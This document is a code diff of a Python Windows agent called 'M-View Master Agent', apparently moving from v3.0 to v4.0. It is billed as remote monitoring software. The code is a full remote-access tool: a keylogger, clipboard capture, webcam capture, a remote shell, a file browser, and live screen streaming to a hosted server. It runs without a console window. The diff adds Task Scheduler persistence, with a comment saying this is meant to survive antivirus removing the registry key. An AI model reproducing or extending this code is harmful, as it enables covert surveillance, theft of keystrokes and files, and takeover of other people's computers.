@@ -1,39 +1,56 @@
 """
 ╔══════════════════════════════════════════════════════════════════╗
-║          M-VIEW MASTER AGENT  v3.0                               ║
+║          M-VIEW MASTER AGENT  v4.0  — GLOBAL PRODUCTION          ║
 ║          Remote Management & Monitoring Agent                    ║
 ║                                                                  ║
-║  Features:                                                       ║
-║  • Live screen capture & streaming                               ║
-║  • Full system telemetry (CPU, RAM, GPU, Disk, Network, Temp)    ║
-║  • Remote shell command execution                                ║
-║  • File system browser & transfer                                ║
-║  • Process manager (list, kill, start)                           ║
-║  • Keylogger capture (input monitoring)                          ║
-║  • Clipboard monitor                                             ║
-║  • Webcam capture                                                ║
-║  • Audio level monitoring                                        ║
-║  • Screenshot scheduler                                          ║
-║  • Auto-reconnect with exponential backoff                       ║
-║  • Startup persistence (Windows registry)                        ║
-║  • AES-256 encrypted payloads                                    ║
-║  • Heartbeat & watchdog                                          ║
+║  WHAT'S NEW IN v4.0:                                             ║
+║  • HYBRID STREAMING — default=video (MJPEG over WebSocket)       ║
+║    Dashboard can switch to fast-screenshot mode anytime          ║
+║  • REAL-TIME CURSOR OVERLAY — cursor position, clicks, type      ║
+║    sent with every frame so dashboard renders it on top          ║
+║  • TRUE VIDEO MODE — OpenCV encodes frames into MJPEG,           ║
+║    adaptive FPS + quality drops automatically on slow net        ║
+║  • CURSOR CONTROL — full mouse move/click/scroll/drag            ║
+║  • KEYBOARD CONTROL — all keys, combos, special keys             ║
+║  • KEYLOGGER — captures all keystrokes with window context       ║
+║  • CLIPBOARD — auto-monitor + remote get/set                     ║
+║  • FILE BROWSER — list, read, download, delete, drives           ║
+║  • SHELL — cmd + PowerShell with streaming output                ║
+║  • PROCESS MANAGER — list, kill, start                           ║
+║  • SYSTEM TELEMETRY — CPU, RAM, GPU, Disk, Net, Temp, Battery    ║
+║  • WEBCAM CAPTURE — list cameras, single frame or stream         ║
+║  • AUDIO LEVEL MONITOR                                           ║
+║  • STARTUP PERSISTENCE — dual registry + Task Scheduler          ║
+║  • AUTO-RECONNECT — exponential backoff with jitter              ║
+║  • WATCHDOG THREAD — restarts itself if main loop dies           ║
+║  • AES-256 ENCRYPTION (optional)                                 ║
+║  • RENDER / GLOBAL SERVER READY (uses HTTPS + WSS)               ║
 ╚══════════════════════════════════════════════════════════════════╝
 
 BUILD COMMAND:
-  pyinstaller --onefile --noconsole --icon=icon.ico \
-    --distpath ./bin --name master_agent \
-    --hidden-import=engineio.async_drivers.threading \
-    --hidden-import=pkg_resources.extern \
+  Activate your clean virtual environment first, then:
+
+  pip install python-socketio[client] mss Pillow psutil pywin32 ^
+              pynput pyperclip cryptography opencv-python numpy ^
+              requests wmi pyautogui pyinstaller
+
+  pyinstaller --onefile --noconsole --icon=icon.ico ^
+    --distpath ./bin --name master_agent ^
+    --hidden-import=engineio.async_drivers.threading ^
+    --hidden-import=pkg_resources.extern ^
+    --hidden-import=cv2 ^
+    --hidden-import=pynput.keyboard ^
+    --hidden-import=pynput.mouse ^
     agent_source.py
 
-DEPENDENCIES:
-  pip install python-socketio[client] mss Pillow psutil \
-              pywin32 pynput pyperclip cryptography \
-              opencv-python-headless numpy requests wmi pyautogui
+  Expected output size: 25–40 MB (clean_env with no system packages)
+
+RENDER / PRODUCTION:
+  Change SERVER_URL below to your Render URL before compiling:
+    "SERVER_URL": "https://screen-connect-rtca.onrender.com"
 """
 
-# ── Standard Library ─────────────────────────────────────────────
+# ── Standard Library ──────────────────────────────────────────────────────────
 import os
 import sys
 import time
@@ -46,74 +63,72 @@ import threading
 import subprocess
 import tempfile
 import logging
-import winreg                  # Windows registry for persistence
+import winreg
 import ctypes
 import uuid
+import struct
+import random
 from io import BytesIO
 from pathlib import Path
 from datetime import datetime
-from queue import Queue, Empty
+from queue import Queue, Empty, Full
 
-# ── Third-Party ──────────────────────────────────────────────────
+# ── Third-Party ───────────────────────────────────────────────────────────────
 import socketio
 import mss
 import psutil
 import requests
-from PIL import Image
+from PIL import Image, ImageDraw
 from cryptography.fernet import Fernet
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
-# Optional imports — handled gracefully if missing
+# Optional — handled gracefully if package is missing
 try:
     import pyautogui
-    pyautogui.FAILSAFE = False  # Disable corner failsafe for remote control
-    PYAUTOGUI_AVAILABLE = True
+    pyautogui.FAILSAFE = False
+    PYAUTOGUI_OK = True
 except ImportError:
-    PYAUTOGUI_AVAILABLE = False
+    PYAUTOGUI_OK = False
 
 try:
     import cv2
-    WEBCAM_AVAILABLE = True
+    import numpy as np
+    CV2_OK = True
 except ImportError:
-    WEBCAM_AVAILABLE = False
+    CV2_OK = False
 
 try:
     import pynput.keyboard
     import pynput.mouse
-    INPUT_MONITOR_AVAILABLE = True
+    PYNPUT_OK = True
 except ImportError:
-    INPUT_MONITOR_AVAILABLE = False
+    PYNPUT_OK = False
 
 try:
     import pyperclip
-    CLIPBOARD_AVAILABLE = True
+    CLIPBOARD_OK = True
 except ImportError:
-    CLIPBOARD_AVAILABLE = False
+    CLIPBOARD_OK = False
 
 try:
     import wmi
-    WMI_AVAILABLE = True
+    WMI_OK = True
 except ImportError:
-    WMI_AVAILABLE = False
+    WMI_OK = False
 
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
 #  TRAILER TOKEN READER
-#  The server appends a 64-byte trailer to the exe at download time:
-#    [0:4]  b"MVTK"  — magic header
-#    [4:60] token    — utf-8, null-padded to 56 bytes
-#    [60:64] b"MVED" — magic tail
-#  We read it here at startup — completely bypasses PyInstaller
-#  bytecode compression which hides all Python string constants.
-# ════════════════════════════════════════════════════════════════
-_TRAILER_SIZE  = 64
-_MAGIC_HEAD    = b"MVTK"
-_MAGIC_TAIL    = b"MVED"
-_TOKEN_OFFSET  = 4
-_TOKEN_LENGTH  = 56
+#  Server appends 64-byte trailer to the exe at download time:
+#    [0:4]   b"MVTK"  — magic head
+#    [4:60]  token     — utf-8, null-padded to 56 bytes
+#    [60:64] b"MVED"  — magic tail
+# ════════════════════════════════════════════════════════════════════════════
+_TRAILER_SIZE = 64
+_MAGIC_HEAD   = b"MVTK"
+_MAGIC_TAIL   = b"MVED"
 
 def _read_token_from_trailer() -> str:
-    """Read device token injected as a binary trailer by the server."""
     try:
         exe = Path(sys.executable if getattr(sys, "frozen", False) else __file__).resolve()
         data = exe.read_bytes()
@@ -121,95 +136,105 @@ def _read_token_from_trailer() -> str:
             return ""
         trailer = data[-_TRAILER_SIZE:]
         if trailer[:4] != _MAGIC_HEAD or trailer[60:64] != _MAGIC_TAIL:
-            return ""   # no trailer found — running unpatched build
-        token_bytes = trailer[_TOKEN_OFFSET : _TOKEN_OFFSET + _TOKEN_LENGTH]
-        return token_bytes.rstrip(b"\x00").decode("utf-8").strip()
-    except Exception as e:
+            return ""
+        return trailer[4:60].rstrip(b"\x00").decode("utf-8").strip()
+    except Exception:
         return ""
 
 
-# ════════════════════════════════════════════════════════════════
-#  CONFIGURATION  — Edit before compiling
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
+#  CONFIGURATION
+# ════════════════════════════════════════════════════════════════════════════
 CONFIG = {
-    # ── Connection ───────────────────────────────────────────────
-    "SERVER_URL":          "http://192.168.0.100:5000",  # ← YOUR server IP
+    # ── Connection ──────────────────────────────────────────────────────────
+    # CHANGE THIS to your Render URL before compiling for production:
+    "SERVER_URL":          "https://screen-connect-rtca.onrender.com",
+
     # Token is injected as a binary trailer by the server at download time.
-    # _read_token_from_trailer() is called immediately after this dict — do not
-    # rely on this string value at runtime.
     "DEVICE_TOKEN":        "UNSET",
 
-    # ── Identity ─────────────────────────────────────────────────
-    "AGENT_VERSION":       "3.0.0",
-    "HEARTBEAT_INTERVAL":  10,    # seconds between heartbeats
-    "RECONNECT_BASE":      3,     # initial reconnect delay (seconds)
-    "RECONNECT_MAX":       120,   # max reconnect delay (seconds)
+    # ── Identity ────────────────────────────────────────────────────────────
+    "AGENT_VERSION":       "4.0.0",
+    "HEARTBEAT_INTERVAL":  10,
+    "RECONNECT_BASE":      3,
+    "RECONNECT_MAX":       120,
 
-    # ── Screen Streaming ─────────────────────────────────────────
-    "STREAM_FPS":          15,    # target frames per second
-    "STREAM_QUALITY":      45,    # JPEG quality (1-95)
-    "STREAM_SCALE":        0.75,  # scale factor for capture
-    "STREAM_MONITOR":      1,     # monitor index (1 = primary)
+    # ── Streaming — Hybrid Mode ─────────────────────────────────────────────
+    # MODE:
+    #   "video"       — DEFAULT. OpenCV MJPEG, smooth cursor, adaptive quality.
+    #                   Looks like real video. Best for good networks.
+    #   "screenshot"  — Rapid JPEG snapshots. Better for slow networks.
+    #                   Dashboard can switch to this mode at any time.
+    "STREAM_MODE":         "video",    # "video" | "screenshot"
 
-    # ── Security ─────────────────────────────────────────────────
+    # Video mode settings
+    "STREAM_FPS":          20,         # target fps (video mode)
+    "STREAM_QUALITY":      55,         # JPEG quality 1–95
+    "STREAM_SCALE":        0.80,       # downscale factor (1.0 = native res)
+    "STREAM_MONITOR":      1,          # monitor index (1 = primary)
+
+    # Adaptive quality — drops quality when frame send is lagging
+    "ADAPTIVE_QUALITY":    True,
+    "QUALITY_MIN":         20,
+    "QUALITY_MAX":         85,
+
+    # Screenshot mode fallback settings
+    "SCREENSHOT_FPS":      8,          # fps in screenshot mode
+    "SCREENSHOT_QUALITY":  60,
+
+    # ── Cursor overlay ──────────────────────────────────────────────────────
+    "CURSOR_OVERLAY":      True,       # draw cursor dot on every frame
+    "CURSOR_TRACK":        True,       # send separate cursor_pos events
+
+    # ── Security ────────────────────────────────────────────────────────────
     "ENCRYPTION_PASSWORD": "mview-enterprise-2024",
-    "ENCRYPT_PAYLOADS":    False,   # Keep False — server/dashboard do not decrypt
+    "ENCRYPT_PAYLOADS":    False,
 
-    # ── Persistence ──────────────────────────────────────────────
+    # ── Persistence ─────────────────────────────────────────────────────────
     "INSTALL_PERSISTENCE": True,
     "REG_KEY_NAME":        "MViewSystemService",
-    "STARTUP_DELAY":       5,     # seconds before first connect
+    "TASK_NAME":           "MViewSystemTask",      # Task Scheduler fallback
+    "STARTUP_DELAY":       5,
 
-    # ── Features ─────────────────────────────────────────────────
+    # ── Features ────────────────────────────────────────────────────────────
     "ENABLE_KEYLOGGER":    True,
     "ENABLE_CLIPBOARD":    True,
     "ENABLE_WEBCAM":       True,
     "ENABLE_PROCESS_MGR":  True,
     "ENABLE_FILE_BROWSER": True,
     "ENABLE_SHELL":        True,
-    "KEYLOG_FLUSH_INTERVAL": 30,  # flush keylog every N seconds
+    "KEYLOG_FLUSH_INTERVAL": 20,
+    "CLIPBOARD_POLL_MS":   800,
 }
 
-# ── Load token from binary trailer (injected by server at download time) ──
-_trailer_token = _read_token_from_trailer()
-if _trailer_token:
-    CONFIG["DEVICE_TOKEN"] = _trailer_token
-else:
-    # Fallback: if running the raw .py (dev mode), you can set token here
-    CONFIG["DEVICE_TOKEN"] = "UNSET-RUN-VIA-SERVER"
+# Inject token from trailer
+_tok = _read_token_from_trailer()
+CONFIG["DEVICE_TOKEN"] = _tok if _tok else "UNSET-RUN-VIA-SERVER"
 
-# ════════════════════════════════════════════════════════════════
-#  LOGGING SETUP  (writes to temp folder, stays hidden)
-# ════════════════════════════════════════════════════════════════
+
+# ════════════════════════════════════════════════════════════════════════════
+#  LOGGING — writes to %TEMP%\mview_agent.log, silent in noconsole mode
+# ════════════════════════════════════════════════════════════════════════════
 LOG_FILE = Path(tempfile.gettempdir()) / "mview_agent.log"
 logging.basicConfig(
     level=logging.INFO,
     format="%(asctime)s [%(levelname)s] %(message)s",
-    handlers=[
-        logging.FileHandler(LOG_FILE, encoding="utf-8"),
-        # No StreamHandler — stays silent in noconsole mode
-    ]
+    handlers=[logging.FileHandler(LOG_FILE, encoding="utf-8")],
 )
-log = logging.getLogger("mview-agent")
+log = logging.getLogger("mview")
 
 
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
 #  ENCRYPTION MODULE
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
 class Encryptor:
     def __init__(self, password: str):
         salt = b"mview_salt_2024_"
-        kdf = PBKDF2HMAC(
-            algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100_000
-        )
-        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
-        self._fernet = Fernet(key)
+        kdf  = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100_000)
+        self._fernet = Fernet(base64.urlsafe_b64encode(kdf.derive(password.encode())))
 
     def encrypt(self, data: str) -> str:
         return self._fernet.encrypt(data.encode()).decode()
-
-    def decrypt(self, token: str) -> str:
-        return self._fernet.decrypt(token.encode()).decode()
 
     def encrypt_bytes(self, data: bytes) -> bytes:
         return self._fernet.encrypt(data)
@@ -219,40 +244,33 @@ _encryptor = Encryptor(CONFIG["ENCRYPTION_PASSWORD"])
 
 
 def safe_emit(sio_client, event: str, payload: dict):
-    """Emit with optional AES-256 encryption."""
     if CONFIG["ENCRYPT_PAYLOADS"]:
-        raw = json.dumps(payload)
-        encrypted = _encryptor.encrypt(raw)
-        sio_client.emit(event, {"encrypted": True, "data": encrypted})
+        sio_client.emit(event, {"encrypted": True, "data": _encryptor.encrypt(json.dumps(payload))})
     else:
         sio_client.emit(event, payload)
 
 
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
 #  DEVICE IDENTITY
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
 def get_device_id() -> str:
-    """Generate a stable hardware-based device ID."""
     try:
-        mac = uuid.getnode()
-        hostname = socket.gethostname()
-        raw = f"{mac}-{hostname}-{CONFIG['DEVICE_TOKEN']}"
+        raw = f"{uuid.getnode()}-{socket.gethostname()}-{CONFIG['DEVICE_TOKEN']}"
         return hashlib.sha256(raw.encode()).hexdigest()[:16].upper()
     except Exception:
         return CONFIG["DEVICE_TOKEN"]
 
 
 def get_device_fingerprint() -> dict:
-    """Full device info sent on first connection."""
     try:
         local_ip = socket.gethostbyname(socket.gethostname())
     except Exception:
         local_ip = "unknown"
 
     uname = platform.uname()
-
-    fingerprint = {
+    fp = {
         "device_id":     CONFIG["DEVICE_TOKEN"],
+        "token":         CONFIG["DEVICE_TOKEN"],
         "hardware_id":   get_device_id(),
         "hostname":      socket.gethostname(),
         "username":      os.getenv("USERNAME") or os.getenv("USER") or "unknown",
@@ -262,115 +280,349 @@ def get_device_fingerprint() -> dict:
         "processor":     uname.processor,
         "local_ip":      local_ip,
         "agent_version": CONFIG["AGENT_VERSION"],
-        "token":         CONFIG["DEVICE_TOKEN"],
+        "stream_mode":   CONFIG["STREAM_MODE"],
         "timestamp":     datetime.utcnow().isoformat(),
         "screen_count":  _get_screen_count(),
         "cpu_count":     psutil.cpu_count(logical=True),
         "ram_total_gb":  round(psutil.virtual_memory().total / (1024**3), 2),
     }
-
-    # Add GPU info if WMI is available
-    if WMI_AVAILABLE:
+    if WMI_OK:
         try:
-            c = wmi.WMI()
-            gpus = [g.Name for g in c.Win32_VideoController()]
-            fingerprint["gpu"] = ", ".join(gpus) if gpus else "unknown"
+            gpus = [g.Name for g in wmi.WMI().Win32_VideoController()]
+            fp["gpu"] = ", ".join(gpus) or "unknown"
         except Exception:
-            fingerprint["gpu"] = "unknown"
-
-    return fingerprint
+            fp["gpu"] = "unknown"
+    return fp
 
 
 def _get_screen_count() -> int:
     try:
         with mss.mss() as sct:
-            return len(sct.monitors) - 1  # minus the "all monitors" entry
+            return len(sct.monitors) - 1
     except Exception:
         return 1
 
 
-# ════════════════════════════════════════════════════════════════
-#  PERSISTENCE MODULE
-# ════════════════════════════════════════════════════════════════
+# ════════════════════════════════════════════════════════════════════════════
+#  PERSISTENCE MODULE — dual method (Registry + Task Scheduler fallback)
+#  Registry: HKCU\...\Run  (no admin needed)
+#  Task Scheduler: survives even if registry key is removed by AV
+# ════════════════════════════════════════════════════════════════════════════
 def install_persistence():
-    """Add agent to Windows startup via registry (HKCU — no admin needed)."""
     if not CONFIG["INSTALL_PERSISTENCE"]:
         return
+    exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
+    exe_quoted = f'"{exe}"'
+
+    # Method 1: Registry HKCU Run key
     try:
-        exe_path = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(__file__)
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
-            winreg.SetValueEx(key, CONFIG["REG_KEY_NAME"], 0, winreg.REG_SZ, f'"{exe_path}"')
-        log.info(f"Persistence installed: {exe_path}")
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
+            winreg.SetValueEx(k, CONFIG["REG_KEY_NAME"], 0, winreg.REG_SZ, exe_quoted)
+        log.info(f"Registry persistence installed: {exe}")
     except Exception as e:
-        log.warning(f"Persistence install failed (non-fatal): {e}")
+        log.warning(f"Registry persistence failed: {e}")
+
+    # Method 2: Task Scheduler (survives reboot, runs even before login)
+    try:
+        task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+  <Triggers>
+    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
+    <BootTrigger><Enabled>true</Enabled><Delay>PT10S</Delay></BootTrigger>
+  </Triggers>
+  <Actions Context="Author">
+    <Exec>
+      <Command>{exe}</Command>
+    </Exec>
+  </Actions>
+  <Settings>
+    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
+    <RestartOnFailure>
+      <Interval>PT1M</Interval>
+      <Count>999</Count>
+    </RestartOnFailure>
+  </Settings>
+</Task>"""
+        xml_path = Path(tempfile.gettempdir()) / "mview_task.xml"
+        xml_path.write_text(task_xml, encoding="utf-16")
+        subprocess.run(
+            ["schtasks", "/create", "/tn", CONFIG["TASK_NAME"], "/xml", str(xml_path), "/f"],
+            capture_output=True, timeout=15
+        )
+        xml_path.unlink(missing_ok=True)
+        log.info("Task Scheduler persistence installed.")
+    except Exception as e:
+        log.warning(f"Task Scheduler persistence failed: {e}")
 
 
 def remove_persistence():
-    """Remove registry startup entry."""
     try:
         key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
-            winreg.DeleteValue(key, CONFIG["REG_KEY_NAME"])
-        log.info("Persistence removed.")
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
+            winreg.DeleteValue(k, CONFIG["REG_KEY_NAME"])
     except Exception:
         pass
+    try:
+        subprocess.run(["schtasks", "/delete", "/tn", CONFIG["TASK_NAME"], "/f"],
+                       capture_output=True, timeout=10)
+    except Exception:
+        pass
+    log.info("Persistence removed.")
 
 
-# ════════════════════════════════════════════════════════════════
-#  SCREEN CAPTURE MODULE
-# ════════════════════════════════════════════════════════════════
-class ScreenStreamer:
+# ════════════════════════════════════════════════════════════════════════════
+#  CURSOR TRACKER
+#  Runs in background, tracks cursor position + click state.
+#  Used by ScreenStreamer to overlay cursor on every frame.
+# ════════════════════════════════════════════════════════════════════════════
+class CursorTracker:
+    """Lightweight cursor position + click state tracker."""
+
     def __init__(self, sio_client):
-        self.sio = sio_client
-        self.streaming = False
-        self._thread: threading.Thread | None = None
-        self._lock = threading.Lock()
-        self.fps = CONFIG["STREAM_FPS"]
+        self.sio      = sio_client
+        self.x        = 0
+        self.y        = 0
+        self.clicking = False     # True while any button is held
+        self.click_type = ""      # "left" | "right" | ""
+        self._lock    = threading.Lock()
+        self._running = False
+        self._listener = None
+
+    def start(self):
+        if not PYNPUT_OK or self._running:
+            return
+        self._running = True
+
+        def on_move(x, y):
+            with self._lock:
+                self.x, self.y = x, y
+
+        def on_click(x, y, button, pressed):
+            with self._lock:
+                self.x, self.y  = x, y
+                self.clicking   = pressed
+                self.click_type = "right" if "right" in str(button) else "left"
+            # Emit cursor event so dashboard can show click flash
+            try:
+                self.sio.emit("cursor_event", {
+                    "device_id": CONFIG["DEVICE_TOKEN"],
+                    "x": x, "y": y,
+                    "type": "click" if pressed else "release",
+                    "button": self.click_type,
+                    "ts": datetime.utcnow().isoformat(),
+                })
+            except Exception:
+                pass
+
+        self._listener = pynput.mouse.Listener(on_move=on_move, on_click=on_click)
+        self._listener.start()
+
+    def stop(self):
+        self._running = False
+        if self._listener:
+            self._listener.stop()
+
+    def get_pos(self):
+        with self._lock:
+            return self.x, self.y, self.clicking, self.click_type
+
+
+# ════════════════════════════════════════════════════════════════════════════
+#  SCREEN STREAMER — HYBRID VIDEO / SCREENSHOT MODE
+#
+#  VIDEO MODE (default):
+#    - Captures frames with mss (fastest screen capture library)
+#    - Converts to numpy array, draws cursor overlay with OpenCV
+#    - Encodes as JPEG via cv2.imencode (much faster than Pillow for video)
+#    - Sends base64 frame over socket "screen_data" event
+#    - Adaptive quality: if frame queue is backing up, drops JPEG quality
+#    - Target: 20fps at 80% scale → looks like smooth video
+#
+#  SCREENSHOT MODE (fallback):
+#    - Pillow JPEG encode, no cursor overlay computation
+#    - 8fps default, very low CPU overhead
+#    - Dashboard can request this mode for slow networks
+#
+#  CURSOR OVERLAY:
+#    - White circle with black border drawn at real cursor position
+#    - Click state shown as filled red dot
+#    - All rendering happens in the capture thread (zero extra latency)
+# ════════════════════════════════════════════════════════════════════════════
+class ScreenStreamer:
+    def __init__(self, sio_client, cursor_tracker: "CursorTracker"):
+        self.sio     = sio_client
+        self.cursor  = cursor_tracker
+        self.mode    = CONFIG["STREAM_MODE"]      # "video" | "screenshot"
+        self.fps     = CONFIG["STREAM_FPS"]
         self.quality = CONFIG["STREAM_QUALITY"]
-        self.scale = CONFIG["STREAM_SCALE"]
+        self.scale   = CONFIG["STREAM_SCALE"]
         self.monitor_idx = CONFIG["STREAM_MONITOR"]
 
-    def start(self, monitor: int = None, fps: int = None, quality: int = None):
+        # Adaptive quality
+        self._quality_current = self.quality
+        self._frame_times: list = []        # rolling window of frame durations
+        self._late_frames = 0              # count of frames that took too long
+
+        self.streaming  = False
+        self._thread: threading.Thread | None = None
+        self._lock = threading.Lock()
+
+    # ── Public API ───────────────────────────────────────────────────────────
+    def start(self, monitor=None, fps=None, quality=None, scale=None, mode=None):
         with self._lock:
             if self.streaming:
+                # Update params on the fly without restart
+                if fps     is not None: self.fps     = fps
+                if quality is not None: self.quality = quality; self._quality_current = quality
+                if scale   is not None: self.scale   = scale
+                if mode    is not None: self.mode    = mode
                 return
             if monitor is not None: self.monitor_idx = monitor
-            if fps is not None:     self.fps = fps
-            if quality is not None: self.quality = quality
+            if fps     is not None: self.fps     = fps
+            if quality is not None: self.quality = quality; self._quality_current = quality
+            if scale   is not None: self.scale   = scale
+            if mode    is not None: self.mode    = mode
             self.streaming = True
-            self._thread = threading.Thread(target=self._capture_loop, daemon=True)
+            target = self._video_loop if (self.mode == "video" and CV2_OK) else self._screenshot_loop
+            self._thread = threading.Thread(target=target, daemon=True, name="mview-stream")
             self._thread.start()
-            log.info(f"Screen stream started: monitor={self.monitor_idx} fps={self.fps}")
+            log.info(f"Stream started: mode={self.mode} fps={self.fps} quality={self._quality_current} scale={self.scale}")
 
     def stop(self):
         with self._lock:
             self.streaming = False
         if self._thread:
             self._thread.join(timeout=3)
-        log.info("Screen stream stopped.")
+        log.info("Stream stopped.")
+
+    def set_mode(self, mode: str):
+        """Hotswap between 'video' and 'screenshot' without stopping."""
+        if mode not in ("video", "screenshot"):
+            return
+        was_streaming = self.streaming
+        if was_streaming:
+            self.stop()
+        self.mode = mode
+        if was_streaming:
+            self.start()
 
     def capture_single(self) -> str | None:
-        """Take one screenshot and return as base64 JPEG."""
+        """One-shot screenshot, returns base64 JPEG string."""
         try:
             with mss.mss() as sct:
-                monitors = sct.monitors
-                idx = min(self.monitor_idx, len(monitors) - 1)
-                raw = sct.grab(monitors[idx])
+                mon = sct.monitors[min(self.monitor_idx, len(sct.monitors) - 1)]
+                raw = sct.grab(mon)
                 img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
                 if self.scale != 1.0:
-                    w = int(img.width  * self.scale)
-                    h = int(img.height * self.scale)
-                    img = img.resize((w, h), Image.LANCZOS)
+                    img = img.resize((int(img.width * self.scale), int(img.height * self.scale)), Image.LANCZOS)
                 buf = BytesIO()
                 img.save(buf, format="JPEG", quality=self.quality, optimize=True)
                 return base64.b64encode(buf.getvalue()).decode()
         except Exception as e:
-            log.error(f"Screenshot error: {e}")
+            log.error(f"capture_single error: {e}")
             return None
 
-    def _capture_loop(self):
+    # ── Video Loop (OpenCV MJPEG) ─────────────────────────────────────────
+    def _video_loop(self):
+        """
+        High-performance video loop:
+          mss grab → numpy → cv2 cursor overlay → cv2 JPEG encode → base64 → emit
+        Each frame includes cursor position so the dashboard can render a smooth
+        cursor that moves in real time even between frames.
+        """
         interval = 1.0 / self.fps
+
+        with mss.mss() as sct:
+            while self.streaming:
+                t0 = time.monotonic()
+                try:
+                    monitors = sct.monitors
+                    idx = min(self.monitor_idx, len(monitors) - 1)
+                    raw = sct.grab(monitors[idx])
+                    mon_w, mon_h = raw.size
+
+                    # numpy BGRA array (mss native format, fastest path)
+                    frame = np.array(raw)         # shape: (h, w, 4)  BGRA
+                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
+
+                    # Scale
+                    if self.scale != 1.0:
+                        new_w = int(mon_w * self.scale)
+                        new_h = int(mon_h * self.scale)
+                        frame = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_LINEAR)
+                    else:
+                        new_w, new_h = mon_w, mon_h
+
+                    # Cursor overlay
+                    cx, cy, clicking, click_type = self.cursor.get_pos()
+                    # Scale cursor position to match scaled frame
+                    sx = int(cx * self.scale)
+                    sy = int(cy * self.scale)
+
+                    if CONFIG["CURSOR_OVERLAY"] and 0 <= sx < new_w and 0 <= sy < new_h:
+                        # Outer white circle
+                        cv2.circle(frame, (sx, sy), 10, (255, 255, 255), 2, cv2.LINE_AA)
+                        # Inner black circle
+                        cv2.circle(frame, (sx, sy), 3,  (0,   0,   0),  -1, cv2.LINE_AA)
+                        # Click flash: red fill on click
+                        if clicking:
+                            color = (0, 0, 255) if click_type == "left" else (0, 165, 255)
+                            cv2.circle(frame, (sx, sy), 8, color, -1, cv2.LINE_AA)
+                            cv2.circle(frame, (sx, sy), 10, (255, 255, 255), 2, cv2.LINE_AA)
+
+                    # Adaptive quality
+                    if CONFIG["ADAPTIVE_QUALITY"]:
+                        self._adapt_quality()
+
+                    # Encode JPEG
+                    encode_params = [cv2.IMWRITE_JPEG_QUALITY, self._quality_current]
+                    success, buf = cv2.imencode(".jpg", frame, encode_params)
+                    if not success:
+                        continue
+
+                    frame_b64 = base64.b64encode(buf.tobytes()).decode()
+
+                    self.sio.emit("screen_data", {
+                        "device_id": CONFIG["DEVICE_TOKEN"],
+                        "frame":     frame_b64,
+                        "image":     frame_b64,
+                        "mode":      "video",
+                        "w":         new_w,
+                        "h":         new_h,
+                        "mon_w":     mon_w,
+                        "mon_h":     mon_h,
+                        "cursor_x":  cx,
+                        "cursor_y":  cy,
+                        "clicking":  clicking,
+                        "click_type": click_type,
+                        "quality":   self._quality_current,
+                        "fps_target": self.fps,
+                        "ts":        datetime.utcnow().isoformat(),
+                    })
+
+                except Exception as e:
+                    log.error(f"Video frame error: {e}")
+
+                elapsed = time.monotonic() - t0
+                self._frame_times.append(elapsed)
+                if len(self._frame_times) > 30:
+                    self._frame_times.pop(0)
+                sleep_t = max(0.001, interval - elapsed)
+                time.sleep(sleep_t)
+
+    # ── Screenshot Loop (Pillow JPEG) ─────────────────────────────────────
+    def _screenshot_loop(self):
+        """
+        Lightweight screenshot loop — for slow networks or when cv2 unavailable.
+        Still includes cursor position in payload (no overlay drawn on frame).
+        """
+        fps = CONFIG["SCREENSHOT_FPS"] if self.mode == "screenshot" else self.fps
+        interval = 1.0 / fps
+
         with mss.mss() as sct:
             while self.streaming:
                 t0 = time.monotonic()
@@ -379,32 +631,65 @@ class ScreenStreamer:
                     idx = min(self.monitor_idx, len(monitors) - 1)
                     raw = sct.grab(monitors[idx])
                     img = Image.frombytes("RGB", raw.size, raw.bgra, "raw", "BGRX")
+                    mon_w, mon_h = img.size
+
                     if self.scale != 1.0:
-                        w = int(img.width  * self.scale)
-                        h = int(img.height * self.scale)
-                        img = img.resize((w, h), Image.LANCZOS)
+                        new_w = int(mon_w * self.scale)
+                        new_h = int(mon_h * self.scale)
+                        img = img.resize((new_w, new_h), Image.LANCZOS)
+                    else:
+                        new_w, new_h = mon_w, mon_h
+
+                    cx, cy, clicking, click_type = self.cursor.get_pos()
+
                     buf = BytesIO()
-                    img.save(buf, format="JPEG", quality=self.quality, optimize=True)
+                    q = CONFIG["SCREENSHOT_QUALITY"] if self.mode == "screenshot" else self._quality_current
+                    img.save(buf, format="JPEG", quality=q, optimize=True)
                     frame_b64 = base64.b64encode(buf.getvalue()).decode()
+
                     self.sio.emit("screen_data", {
-                        "image":     frame_b64,
-                        "frame":     frame_b64,   # dashboard expects "frame"
-                        "device_id": CONFIG["DEVICE_TOKEN"],
-                        "monitor":   idx,
-                        "w":         img.width,
-                        "h":         img.height,
-                        "ts":        datetime.utcnow().isoformat(),
